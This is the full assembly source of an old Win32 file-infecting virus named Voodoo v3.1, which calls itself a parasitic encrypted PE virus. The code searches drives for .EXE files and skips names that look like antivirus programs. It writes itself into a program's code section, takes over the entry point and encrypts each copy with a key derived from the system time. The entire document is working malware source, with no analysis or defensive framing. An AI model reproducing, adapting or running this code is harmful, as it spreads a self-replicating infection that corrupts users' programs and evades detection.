; ============================ Win32.Voodoo_v3.1 ===========================
; Program       : Voodoo v3.1
; Description   : Parasitic,crypt PE virus
; Last modified : 01.09.1999
; Purpose       : process handling under win32
; Target OS     : Win95/98/NT
; Notes         :
ImBase equ 00400000h
Entyp  equ 00001000h
ADDC   equ ImBase+Entyp+5
DiskCount EqU 4
FileCount EqU 1
SYSTEM32CRC EQU 04C6D9398h
.386p
.model flat
VirSize EQU offset Voodoo_Ver_3_0E - offset Voodoo_Ver_3_1
MemSize Equ 2300h
extrn   ExitProcess:PROC
include win32con.inc ; описание consts
.DATA
db 0
flag dd 12345678h
CheckSum        EQU 0B0966F54h
CheckSum2       EQU 05E5F512Fh
GlobalAllocCRC  EQU 01D2925FEh
GlobalLockCRC   EQU 0BABEC79Dh
GlobalUnlockCRC EQU 09EA2AB80h
GlobalFreeCRC   EQU 0B3BDC497h

CreateFileACRC        EQU 0FE222F03h
CreateFileMappingACRC EQU 0CCF0FBCBh
MapViewOfFileCRC      EQU 0D3DED3B4h
UnmapViewOfFileCRC    EQU 0A5ADAF97h
FlushViewOfFileCRC    EQU 0AFBFBF98h
ReadFileCRC           EQU 0E5E1DAC2h

CloseHandleCRC        EQU 02731310Dh
FindFirstFileACRC     EQU 0315E6238h
FindNextFileACRC      EQU 0C7F4F8CFh
SetFileAttributesACRC EQU 0EE2112FBh
SetFileTimeCRC        EQU 012211900h
GetFileSizeCRC        EQU 01E2D17F3h
GetCommandLineACRC    EQU 08CBFBF94h
lstrcpyACRC           EQU 001342E28h
SetFilePointerCRC     EQU 065676742h
GetCurrentDirectoryCRC  EQU 0E012FECDh
SetCurrentDirectoryCRC  EQU 0E012FED9h
GetSystemTimeCRC      EQU 018271EF9h
_GlobalUnlock       EQU  0
_GlobalFree         EQU _GlobalUnlock+4
_CreateFileA        EQU _GlobalFree+4
_CreateFileMappingA EQU _CreateFileA+4
_MapViewOfFile      EQU _CreateFileMappingA+4
_UnmapViewOfFile    EQU _MapViewOfFile+4
_FlushViewOfFile    EQU _UnmapViewOfFile+4
_CloseHandle        EQU _FlushViewOfFile+4
_FindFirstFileA     EQU _CloseHandle+4
_FindNextFileA      EQU _FindFirstFileA+4
_SetFileAttributesA EQU _FindNextFileA+4
_SetFileTime        EQU _SetFileAttributesA+4
_GetFileSize        EQU _SetFileTime+4
_GetCommandLineA    EQU _GetFileSize+4
_ReadFile           EQU _GetCommandLineA+4
_lstrcpyA           EQU _ReadFile+4
_SetFilePointer     EQU _lstrcpyA+4
_GetCurrentDirectory EQU _SetFilePointer+4
_SetCurrentDirectory EQU _GetCurrentDirectory+4
_GetSystemTime      EQU _SetCurrentDirectory+4
OldEBP              EQU _GetSystemTime+4
FileSize            EQU OldEBP+4
HhendleOfFile       EQU FileSize+4
HhendleOfMapFile    EQU HhendleOfFile+4
Pointer2MapFile     EQU HhendleOfMapFile+4
tag                 EQU Pointer2MapFile+4
SearcHandle         EQU tag+2
SearcHandle2        EQU SearcHandle+4
systemtime          EQU SearcHandle2+4
CODEBUF             EQU systemtime +16
CommandLine         EQU CODEBUF+VirSize
CurDir              EQU CommandLine+800
CurDir2             EQU CurDir+800
Win32FindData       EQU CurDir2 +800
   CreationTime        EQU Win32FindData+4
   LastAccessTime      EQU CreationTime+4
   LastWriteTime       EQU LastAccessTime+4
   files               EQU LastWriteTime+32

NumberOfBytesRead   EQU MemSize-4
.CODE
@Name_Pointers_RVA EQU offset Name_Pointers_RVA - offset EntryPoint_
@GetProcAddress    EQU offset GetProcAddress - offset EntryPoint_
@KernelHandle      EQU offset KernelHandle   - offset EntryPoint_
@_GlobalAlloc      EQU offset _GlobalAlloc  - offset EntryPoint_
@_GlobalLock       EQU offset _GlobalLock  - offset EntryPoint_
@MemPointer        EQU offset MemPointer  - offset EntryPoint_
@NextCode          EQU offset NextCode  - offset EntryPoint_
@Dirmask           EQU offset Dirmask - offset EntryPoint_
@mask              EQU offset mask - offset EntryPoint_
@disk              EQU offset disk - offset EntryPoint_
@EntryPointRVA     EQU offset EntryPointRVA - offset EntryPoint_
@ImportTable       EQU offset ImportTable - offset EntryPoint_
@EndImportTable    EQU offset EndImportTable - offset EntryPoint_
Voodoo_Ver_3_1:
Call EntryPoint_
EntryPoint_:
;find MZ in memory
;----------------------
popravka EQU offset CryptBegin - offset Voodoo_Ver_3_1
INCAX    EQU offset @INCAX - offset Voodoo_Ver_3_1
CRCcode  EQU offset @CRCcode - offset Voodoo_Ver_3_1
 mov al,00
 call _k
_k:pop esi

   mov ecx,VirSize - popravka
   add esi,offset CryptBegin- offset _k ;10h+18+6
   mov ebp,esp
crypt: xor byte ptr [esi],al
       mov dword ptr [ebp+18],12345678h
       cmp dword ptr [ebp+18+1],12345678h
       jne k
       jmp Voodoo_Ver_3_0E
k:     inc esi
@INCAX:db 90h, 90h, 90h ;add ax,cx
       loop crypt
CryptBegin:
;----------------------
popravka2 EQU offset CryptBegin2 - offset Voodoo_Ver_3_1
INCAX2     EQU offset @INCAX2 -  offset Voodoo_Ver_3_1
@CRCcode:
 mov al,00
 call _k2
_k2:pop esi

   mov ecx,VirSize - popravka2
   add esi,offset CryptBegin2- offset _k2 ;10h+18+6
   mov ebp,esp
crypt2: xor byte ptr [esi],al
       mov dword ptr [ebp+18],12345678h
       cmp dword ptr [ebp+18+1],12345678h
       jne k2
       jmp Voodoo_Ver_3_0E
k2:     inc esi
@INCAX2:db 90h, 90h, 90h ;add ax,cx
       loop crypt2
CryptBegin2:
;----------------------
 call _ESI
_ESI: pop esi
      pop ecx
  call  ScanMZ
   ; in esi PE header
   add esi,80h
   add edi,dword ptr [esi]     ;Import RVA
   jmp @L1
NotKERNEL32:
    MOV EBX,EBP
    add edi,00014h
@L1:
   cmp dword ptr [edi+0ch],000000h
   je NOtFound
   add ebx,dword ptr [edi+0ch] ;RVA NAme  of dll
   call CRCSum
   cmp eax,CheckSum
   jne NotKERNEL32
   push ebp
   pop esi
   add ESI,DWORD ptr [edi+10h] ;KERNEL32 proc
   mov esi,dword ptr [esi]
   cmp byte ptr [esi+5],0e9h   ; win98
   jne Ok_
   add esi,dword ptr [esi+6]
Ok_:call ScanMZ
   ;push EBP ;Hendle of KERNEL32.dll
   add esi,78h
   add edi,dword ptr [esi]     ; edi=Export Directory Table RVA
   mov eax,ebp
   add eax,dword ptr [edi+1ch]    ; Address Table
   push eax
   mov edx,ebp
   add edx,dword ptr [edi+24h]    ; Ordinal Table
   add ebx,dword ptr [edi+20h] ;ebx=Name Pointers RVA
   mov dword ptr [ecx+@Name_Pointers_RVA],ebx
   mov esi,ebx
   push ecx
   mov ecx,dword ptr [edi+18h] ; Num of Name Pointers
   push ecx
@L2:call ScanNameTable
    cmp eax,CheckSum2
    je FoundGetProcAdr
    inc esi
    inc esi
    inc esi
    inc esi
    loop @L2
FoundGetProcAdr:
    pop eax
    sub eax,ecx ; #function
    shl eax,1   ; x2
    ; Ordinal Table
    add edx,eax ;
    xor eax,eax
    mov ax,word ptr [edx] ;Ordinal of GetProcAddress
    shl eax,2   ;x4
    pop ecx  ;entry
    pop ebx  ; offset to Address Table
    add ebx,eax
    mov eax,dword ptr [ebx]
    add eax,ebp
    mov [@GetProcAddress+ecx],eax
    mov [@KernelHandle+ecx],ebp
    mov edx,GlobalAllocCRC
    call  CalkProcAdress
    mov [@_GlobalAlloc+ecx],eax
    mov edx,GlobalLockCRC
    call  CalkProcAdress
    mov [@_GlobalLock+ecx],eax
    push ecx
    push MemSize
    push 0
    call dword ptr [@_GlobalAlloc+ecx]
    pop ecx
    push ecx
    push eax
    call dword ptr [@_GlobalLock+ecx]
    pop ecx
    mov [@MemPointer+ecx],eax
    mov eBX,eax
    mov edi,eax
    mov esi,@ImportTable
    add esi,ecx
MakeImport:
    mov edx,dword ptr [esi]
    call CalkProcAdress
    cld
    stosd
    inc esi
    inc esi
    inc esi
    inc esi
    cmp word ptr [esi],6666h
    jne MakeImport
    mov ebp,ecx  ; entry !
    ;--------------------

    ;####################
          call  Infect
    ;####################
          mov esi,ebp
          sub esi,5
          mov edi,CODEBUF
          add edi,ebx     ;MemPointer
          cld
          mov ecx,VirSize
          rep movsb
NOtFound:
          cmp  [flag],12345678h
          jne Ret2Prog
          push 0
          call ExitProcess
Ret2Prog:  mov [OldEBP+ebx],ebp
           mov esi,ebx
           mov ebp,esi
           add esi,@NextCode+CODEBUF+5
           add ebp,CODEBUF+5
           jmp esi
NextCode:
          call    GetCommandLineA
          mov esi,eax
          cmp byte ptr [esi+1],':' ;for win9x
          je NormalCommandLine
          inc eax
NormalCommandLine:
        push    eax
        mov eax,CommandLine
        add eax,ebx
        push eax
        call    lstrcpyA
        mov esi,CommandLine
        add esi,ebx
            push esi
@L3:     inc esi
         cmp byte ptr [esi],'.'
         jne @L3
         mov byte ptr [esi+4],0
            pop eax
         push NULL
         push FILE_ATTRIBUTE_ARCHIVE
         push OPEN_EXISTING
         push NULL
         push FILE_SHARE_READ ;or FILE_SHARE_WRITE
         push GENERIC_READ ;or GENERIC_WRITE
         push eax
         call CreateFileA
         mov [HhendleOfFile+ebx],eax
         push eax
         push NULL
         push eax
         call GetFileSize
         mov edx,eax
         sub edx,VirSize
          pop eax
          push eax

          push 0
          push NULL
          push edx
          push eax
          call SetFilePointer
          pop eax
           mov edx,[ebx+OldEBP]
           sub edx,5
           push edx
           push NULL
           mov ecx,NumberOfBytesRead
           add ecx,ebx
           push ecx
           push VirSize
           push edx
           push eax
           call ReadFile
           pop esi
           call _EDI
EntryPointRVA: dd 0
_EDI:      pop edi
           add esi,dword ptr [edi]
           jmp esi
;----------------------------------------------------------
PushWin32FindData:
        mov edx,Win32FindData
        add edx,ebx
        ret
InfectDir:
        mov eax,CurDir2
        add eax,ebx
        push eax        ;
        push  800
        call GetCurrentDirectory
        call Infect_All_files
        call PushWin32FindData
        push edx

        mov eax,ebp
        add eax,@Dirmask
        push eax
        call    FindFirstFileA
        mov  dword ptr [SearcHandle+ebx],eax
 l2:    call PushWin32FindData
        push edx
        push    dword ptr [SearcHandle+ebx]
        call    FindNextFileA
        or eax,eax
        jz ExitFromProcInfectDir
        cmp byte ptr [files+ebx],'.'
        je  l2
        mov eax,[Win32FindData+ebx]
        and eax,FILE_ATTRIBUTE_DIRECTORY
        jz l2
        ;set new dir
        mov edx,CurDir2
        add edx,ebx
        push edx
        call SetCurrentDirectory
        mov edx,files
        add edx,ebx
        ; SYSTEM32 ?
        push ebx
        mov ebx,edx
        call  CRCSum
        pop ebx
        cmp eax,SYSTEM32CRC
        je  l2 ;DoNotInfect
        push edx
        call SetCurrentDirectory
        call Infect_All_files
        jmp l2
ExitFromProcInfectDir:
        ret
;----------------------------------------------------------
Infect_All_files:
        call PushWin32FindData
        push edx
        mov edx,@mask
        add edx,ebp
        push edx
        xor ecx,ecx
        call    FindFirstFileA
        mov  dword ptr [SearcHandle2+ebx],eax
        cmp     eax,-1
        je     l2__
Next:    or eax,eax
         jz  l2__
        cmp ecx,FileCount
        jge  l2__
        inc  ecx
        push ecx
        call InfectFile
        call PushWin32FindData
        push edx
        push    dword ptr [SearcHandle2+ebx]
        call    FindNextFileA
        pop ecx
        cmp di,9999h
        jne Noerrror
        dec ecx
        xor edi,edi
Noerrror:
        jmp    Next
l2__:   ret
;-----------------------------------------------------------
Infect:
        mov eax,CurDir
        add eax,ebx
        push eax        ;
        push  800
        call GetCurrentDirectory
        call InfectDir
        mov ecx,DiskCount
Scan:   push ecx
        mov eax,@disk
        add eax,ebp
        push eax
        call SetCurrentDirectory
        call InfectDir
        inc byte ptr [@disk+ebp]
        pop ecx
        loop Scan
        mov eax,CurDir
        add eax,ebx
        push eax        ;
        call SetCurrentDirectory
        ret
;----------------------------------------------------------
InfectFile:
         mov eax,ebx
         add eax,files
         cmp word ptr [eax],'-F'   ;F-port
         je  @AV
         cmp word ptr [eax],'WA'   ; AW ?
         je  @AV
         cmp word ptr [eax],'VA'   ; AV?????
         je  @AV
         cmp word ptr [eax+1],'VA' ;NAV,PAV,RAV,_AVP???
         je  @AV
         cmp word ptr [eax+3],'BE' ;drWeb
         je  @AV
         cmp word ptr [eax+2],'DN' ;PANDA
         je  @AV
         cmp dword ptr [eax],'ITNA';ANTI???
         je  @AV
         cmp dword ptr [eax],'FASV';VSAF???
         je  @AV
         cmp dword ptr [eax],'PWSV';VSWP???
         je  @AV
         cmp dword ptr [eax],'VASF';FSAV???
         je  @AV

         push eax
         push 00000020h
         push eax
         call SetFileAttributesA
         pop eax
         push NULL
         push FILE_ATTRIBUTE_ARCHIVE
         push OPEN_EXISTING
         push NULL
         push  FILE_SHARE_READ or FILE_SHARE_WRITE
         push GENERIC_READ or GENERIC_WRITE
         push eax
         call CreateFileA
         cmp eax,-1
         je Error__
         call LoadMemPointer
         mov [HhendleOfFile+ebx],eax
         push ebx
         push NULL
         push eax
         call GetFileSize
         pop ebx
         mov [FileSize+ebx],eax
Point@ret:push edx
         push eax ; to MApViewofFile
         push NULL
         push eax
         push NULL
         push PAGE_READWRITE
         push NULL
         push dword ptr [HhendleOfFile+ebx]
         call CreateFileMappingA
         mov [HhendleOfMapFile+ebx],eax
         ; v steke Size
         push 0
         push 0
         push FILE_MAP_WRITE
         push eax
         call MapViewOfFile
         mov [Pointer2MapFile+ebx],eax
         pop edx
         cmp word ptr [tag+ebx],6666h
         je  OkOb
         mov esi,eax
         CMP byte ptr [esi+18h],40h
         jl OOO
         cmp dword ptr [esi+3ch],00010000h
         jg OOO
         mov edi,dword ptr [esi+3ch]
         cmp dword ptr [esi+edi],00004550h ;PE Only !
         jne  OOO
         cmp dword ptr [esi+6fh],334e4957h ;'WIN3'  Infected ?
         je  OOO
         ;find CODE object
         mov [systemtime+ebx],esi
;
         add esi,edi
         mov eax,dword ptr [esi+80h] ;Import Table RVA
         push eax
         xor ecx,ecx
         mov cx,word ptr [esi+6h] ;Num of Object
         MOV EDX,DWORD ptr [esi+28h] ; Entry point RVA
         mov dword ptr [ebp+@EntryPointRVA],edx
         mov edx,esi
         mov eax,24
         add ax,word ptr [esi+14h]
         mov edi,esi
         add edi,eax ;edi=Object Table
         pop eax ;Import Table RVA
         pusha
         mov edx,eax
Find_Import_Table:
         dec ecx
         mov eax,dword ptr [edi+0ch] ; Object RVA
         cmp edx,eax
         jge Mabe
IncEDI:  add edi,28h
         or ecx,ecx
         je Not_Find
         jmp Find_Import_Table
Mabe:    add eax,dword ptr [edi+10h] ; SIZE
         CMP EDX,EAX   ; Object RVA =< Import Table RVA =< Object RVA + Phisikal Size
         jle L22
         jmp IncEDI
         L22:
         mov esi,[Pointer2MapFile+ebx]
         push edx
         sub edx,dword ptr [edi+0ch]
         add esi,edx
         mov eax,dword ptr [edi+14h]   ;Phis  offset
         add esi,eax
         pop edx                       ; ESI = Phis offset Import Table
         mov ecx,dword ptr [edi+0ch]   ; Object RVA
ECTLI_KERNEL:
         mov edi,dword ptr [esi+0ch]   ; EDI=Name RVA
         cmp edi,NULL ;
         je KERNEL_HET
         sub edi,ecx
         add edi,eax                   ; EAX= Phis offset
         add edi,[Pointer2MapFile+ebx]
         cmp dword ptr [edi],'NREK';KERNEL
         je KERNEL_ECT
         add esi,14h
         jmp ECTLI_KERNEL
KERNEL_HET:
Not_Find:   popa
            jmp Code_Not_Find
KERNEL_ECT: popa
_loop:   db 08Bh,47h,24h ;mov eax,dword [edi+024h]
         EXEC_FLAG EQU 20000020h
         and eax,EXEC_FLAG
         jnz Code_Object
         add edi,2ch
         loop _loop
         jmp Code_Not_Find
Code_Object:
         ;chek object size
          cmp dword ptr [edi+10h],VirSize
          jl Code_Not_Find
          push esi
          mov esi,dword ptr [systemtime+ebx]
          mov dword ptr [esi+6fh],334e4957h
          pop esi
          ; make writeble
          or dword ptr [edi+24h],80000000h
          mov eax,dword ptr [edi+0ch] ;object RVA
          sub dword ptr [ebp+@EntryPointRVA],eax
          mov dword ptr [edx+28h],eax ; Set New Entry Point RVA
          ; save old Programm
          call CloseMapping
          mov word ptr [ebx+tag],06666h
          mov eax,dword ptr [ebx+FileSize]
          push eax
          add eax,VirSize
          jmp Point@ret
  OkOb:   mov word ptr [ebx+tag],09999h
          mov esi,dword ptr [edi+14h] ;phisical offset
          add esi,dword ptr [ebx+Pointer2MapFile]
          ;add esi,edx
          pop edi
          add edi,dword ptr [ebx+Pointer2MapFile]
          mov ecx,VirSize
          push esi   ;CODE
          push esi
          cld
          rep movsb
          ;write bady to program
          mov esi,ebp
          sub esi,5
          pop edi  ; CODE
          mov ecx,VirSize
          cld
          rep movsb
          mov eax,ebx
          add eax,systemtime
          push eax
          call GetSystemTime
          mov ax,word ptr [ebx+systemtime+14]
          pop esi
          mov byte ptr [esi+6],al
          mov byte ptr [esi+CRCcode+1],al ; ?
          mov dword ptr [esi+INCAX],0e2c10366h ;inc ax
          mov dword ptr [esi+INCAX2],0e2c10366h ;inc ax
          push esi
          push eax
          mov ecx,VirSize- popravka2
          add esi,offset CryptBegin2- offset Voodoo_Ver_3_1;
crypt_2:  xor byte ptr [esi],al
         add ax,cx
         inc esi
         loop crypt_2
         pop eax
         POP esi
         mov ecx,VirSize- popravka
         add esi,offset CryptBegin- offset Voodoo_Ver_3_1;2eh+6
crypt_:  xor byte ptr [esi],al
         add ax,cx
         inc esi
         loop crypt_

Code_Not_Find:
OOO2:    call CloseMapping
Error__2: call PushWin32FindData
         push dword ptr [edx]
         mov eax,ebx
         add eax,files
         push eax
         call SetFileAttributesA
@AV:     ret
OOO:      mov di,9999h
          jmp  OOO2
Error__:  mov di,9999h
          jmp Error__2

;--------------------------------------------------------
CalkProcAdress:  push ecx
                 push esi
                 push edi
    mov esi,@Name_Pointers_RVA
    add esi,ecx
    mov esi,dword ptr [esi]
fCRC: call ScanNameTable
    cmp  eax,edx
    je  foCRC
    inc esi
    inc esi
    inc esi
    inc esi
    jmp fCRC
foCRC:
  mov eax,dword ptr [esi]
  add eax,ebp
  push eax
  mov eax,@KernelHandle
  add eax,ecx
  push dword ptr [eax]
  call dword ptr [@GetProcAddress+ecx]
   pop edi
   pop esi
   pop ecx
   ret
;--------------------------------------------------------
ScanNameTable:
    PUSH EBX
    push ecx
    mov ebx,ebp
    add ebx,dword ptr [esi]
    call CRCSum
    pop ecx
    POP EBX
    ret
;--------------------------------------------------------
CRCSum: xor eax,eax
Sum:    add eax,dword ptr [ebx]
        cmp byte ptr [ebx+4],0
        je ExitfromCRCSum
        inc ebx
        jmp Sum
ExitfromCRCSum:
           ret
;--------------------------------------------------------
ScanMZ:
   push ecx   ;  \/
   and si,1111000000000000b
ScanMZ_:
   sub esi,1000h
   cmp word ptr [esi],'ZM'
   jne ScanMZ_
   mov edi,esi
   mov ebx,esi
   MOV EBP,ESI
   push esi
   cmp dword ptr [esi+3ch],00010000h
   jg  NextMZ
   add esi,dword ptr [esi+3ch]
   cmp dword ptr [esi],004550h
NextMZ:pop esi
   jne ScanMZ_
   add esi,dword ptr [esi+3ch]
   pop ecx
   ret
;---Local ----------
CloseMapping:
         push edx
         push dword ptr [Pointer2MapFile+ebx]
         call UnmapViewOfFile
         push dword ptr  [HhendleOfMapFile+ebx]
         call CloseHandle
         pop edx
         ret
;--------------------------------------------------------
LoadMemPointer:
mov ebx,dword ptr ds:[ebp+@MemPointer]
ret
;----Import---------
GetFileSize: call LoadMemPointer
             jmp dword ptr ds:[ebx+_GetFileSize]
CreateFileA: call LoadMemPointer
             jmp dword ptr ds:[ebx+_CreateFileA]
CreateFileMappingA:
             call LoadMemPointer
             jmp dword ptr ds:[ebx+_CreateFileMappingA]
MapViewOfFile:
             call LoadMemPointer
             jmp dword ptr ds:[ebx+_MapViewOfFile]
UnmapViewOfFile:
           call LoadMemPointer
           jmp dword ptr ds:[ebx+_UnmapViewOfFile]
FlushViewOfFile:
           call LoadMemPointer
           jmp dword ptr ds:[ebx+_FlushViewOfFile]
CloseHandle: call LoadMemPointer
             jmp dword ptr ds:[ebx+_CloseHandle]
GetCommandLineA:
              call LoadMemPointer
               jmp dword ptr ds:[ebx+_GetCommandLineA]
lstrcpyA:   call LoadMemPointer
            jmp dword ptr ds:[ebx+_lstrcpyA]
ReadFile:  call LoadMemPointer
           jmp dword ptr ds:[ebx+_ReadFile]
SetFilePointer: call LoadMemPointer
                jmp dword ptr ds:[ebx+_SetFilePointer]
FindFirstFileA: call LoadMemPointer
                jmp dword ptr ds:[ebx+_FindFirstFileA]
FindNextFileA: call LoadMemPointer
               jmp dword ptr ds:[ebx+_FindNextFileA]
GetCurrentDirectory:
call LoadMemPointer
jmp dword ptr ds:[ebx+_GetCurrentDirectory]
SetCurrentDirectory:
call LoadMemPointer
jmp dword ptr ds:[ebx+_SetCurrentDirectory]
SetFileAttributesA:
call LoadMemPointer
jmp dword ptr ds:[ebx+_SetFileAttributesA]
SetFileTime:
call LoadMemPointer
jmp dword ptr ds:[ebx+_SetFileTime]
GetSystemTime:
call LoadMemPointer
jmp dword ptr ds:[ebx+_GetSystemTime]
db '(c) Voodoo/SMF v3.1 07.08.1999'
;-------------------
GetProcAddress    dd  11223344h
KernelHandle      dd  11223344h
Name_Pointers_RVA dd  11223344h
_GlobalAlloc      dd  11223344h
_GlobalLock       dd  11223344h
MemPointer        dd  11223344h
disk              db 'c:\',0
Dirmask           DB '*.*',0
mask              DB '*.EXE',0
ImportCount EQU (offset EndImportTable- offset ImportTable)/4
ImportTable:      dd  GlobalUnlockCRC
                  dd  GlobalFreeCRC
                  dd  CreateFileACRC
                  dd  CreateFileMappingACRC
                  dd  MapViewOfFileCRC
                  dd  UnmapViewOfFileCRC
                  dd  FlushViewOfFileCRC
                  dd  CloseHandleCRC
                  dd  FindFirstFileACRC
                  dd  FindNextFileACRC
                  dd  SetFileAttributesACRC
                  dd  SetFileTimeCRC
                  dd  GetFileSizeCRC
                  dd  GetCommandLineACRC
                  dd  ReadFileCRC
                  dd  lstrcpyACRC
                  dd  SetFilePointerCRC
                  dd  GetCurrentDirectoryCRC
                  dd  SetCurrentDirectoryCRC
                  dd  GetSystemTimeCRC
                  dw  6666h
EndImportTable:
Voodoo_Ver_3_0E:
Ends
End Voodoo_Ver_3_1
===== Cut =====